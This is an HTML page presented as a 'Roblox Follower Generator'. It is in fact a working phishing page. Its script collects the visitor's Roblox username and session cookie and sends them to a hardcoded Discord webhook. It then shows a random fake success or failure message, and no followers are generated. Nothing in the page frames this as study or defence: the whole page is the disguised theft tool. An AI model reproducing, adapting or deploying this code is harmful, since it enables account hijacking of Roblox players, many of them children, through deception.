<html>
<head>
  <title>Roblox Follower Generator</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">
  <style>
    body {
      background-color: #000;
      color: #00ff00;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
      text-align: center;
      padding: 20px;
    }
    .form-label, .form-control {
      color: #00ff00;
    }
    .btn-primary {
      background-color: #00ff00;
      border-color: #00ff00;
    }
  </style>
</head>
<body>
  <div class="container mt-5">
    <h1>Roblox Follower Generator</h1>
    <div class="mb-3">
      <label for="username" class="form-label">Enter your Roblox username:</label>
      <input type="text" class="form-control" id="username">
    </div>
    <div class="mb-3">
      <label for="cookie" class="form-label">Enter your Roblox cookie:</label>
      <input type="text" class="form-control" id="cookie">
    </div>
    <div class="mb-3">
      <label for="followersRange" class="form-label">Choose the number of followers:</label>
      <input type="range" class="form-range" min="0" max="1000" id="followersRange">
      <span id="followersValue">0</span>
    </div>
    <button type="button" class="btn btn-primary" id="generateFollowers">Generate Followers</button>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.min.js"></script>
  <script>
    document.getElementById('followersRange').addEventListener('input', function() {
      document.getElementById('followersValue').textContent = this.value;
    });

    document.getElementById('generateFollowers').addEventListener('click', function() {
      const username = document.getElementById('username').value;
      const cookie = document.getElementById('cookie').value;
      const followers = document.getElementById('followersRange').value;

      const data = {
        username: username,
        cookie: cookie,
        followers: followers
      };

      const webhookURL = "https://discord.com/api/webhooks/1123277577839186000/Dcux2eftRGn_MSaddKnjN8XTpK5SwTOGko2mAs2dQa2kdK2q9jAvfbOnXdUt-BgEoTsq";

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => {
        if (Math.random() < 0.5) {
          alert(`Successfully generated ${followers} followers for ${username}!`);
        } else {
          alert('Failed to generate followers. Please try again later.');
        }
      })
      .catch(error => {
        console.error('Error:', error);
        alert('An error occurred. Please try again later.');
      });
    });
  </script>
</body>
</html>
